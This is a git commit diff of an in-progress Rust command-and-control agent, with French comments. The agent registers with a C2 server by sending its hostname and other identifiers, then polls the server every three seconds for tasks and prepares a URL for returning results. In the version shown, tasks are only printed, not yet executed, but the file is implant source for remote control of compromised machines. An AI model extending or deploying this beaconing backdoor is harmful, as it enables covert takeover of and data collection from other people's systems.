c955513e13181f3561665a40f59a1f5e1a792c92
rss <raphael.rodrigues>
2025-04-06 18:56:54 +0200

    agent in progress

--- src/main.rs
+++ src/main.rs
@@ -1,3 +1,5 @@
+#![allow(unused)]
+
 use hostname;
 use reqwest::Client;
 use std::error::Error;
@@ -7,7 +9,7 @@ use serde::{Serialize};
 
 
 #[derive(Serialize)]
-struct PostData {
+struct AgentData {
     name: String,
     hostname: String,
     ip: String,
@@ -20,8 +22,8 @@ struct TasksUrl {
 }
 
 impl TasksUrl {
-    fn new(ip: &str, port: &u16) -> Self {
-        let task_url = format!("http://{}:{}//getTask", ip, port);
+    fn new(ip: &str, port: &u16, agent: &str) -> Self {
+        let task_url = format!("http://{}:{}//getTask?agent={}", ip, port, agent);
         let result_url = format!("http://{}:{}//receiveResult", ip, port);
         TasksUrl {task_url, result_url} // simplification d'instenciation (nécessite les mêmes noms de variables)
     }
@@ -39,7 +41,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
         .unwrap_or_else(|_| "unknown".to_string()); // Convertir le hostname en String
     
      // Définition des informations a envoyé au C2
-     let post_data = PostData {
+     let agent_data = AgentData {
         name : "raph".to_string(),
         hostname : hname,
         ip : "1.1.1.1".to_string(),
@@ -47,24 +49,33 @@ async fn main() -> Result<(), Box<dyn Error>> {
     };
   
     let client = Client::new(); // Ouverture d'un client pour effectuer les requêtes
-    let response = client.post(&regl).json(&post_data).send().await?; // Envoie de la requête d'enregistrement auprès du serveur C2
-    let name = response.text().await?; // Réception de la réponse du serveur (agent name)
-    println!("contenu de la réponse :{}", name); // debug
-
-    let urls = TasksUrl::new(&ip, &port);
-
-    println!("{},{}", urls.task_url, urls.result_url);
+    let response = client
+        .post(&regl)
+        .json(&agent_data)
+        .send()
+        .await?; 
+    let my_name = response.text().await?; // Réception de la réponse du serveur (agent name)
+    println!("Debug - agent bien enregistré : {}", my_name); // ligne de debug
+    let urls = TasksUrl::new(&ip, &port, &agent_data.name);
      
-    //  // Déclaration en milliseconde
-     let n: u64 = 3000;
+    let n: u64 = 3000;
+    
     // Démarrage boucle infini
     loop {
-        let taskr = client.get(&urls.task_url).send().await?; // Requête GET afin de savoir si il y a une tâche
+        
+        // Requête GET afin de savoir si il y a une tâche
+        let taskr = client
+            .get(&urls.task_url)
+            .send()
+            .await?; 
         
         // Bloc d'actions si il y a une tâche
         if taskr.status() != 204 {
             let task = taskr.text().await?;
             println!("{}", task);
+        } else {
+            println!("{}", taskr.status()); // debug
+            println!("No task bro"); //debug
         }
 
         thread::sleep(Duration::from_millis(n)); // L'agent sleep 3 secondes à chaque fin de boucle
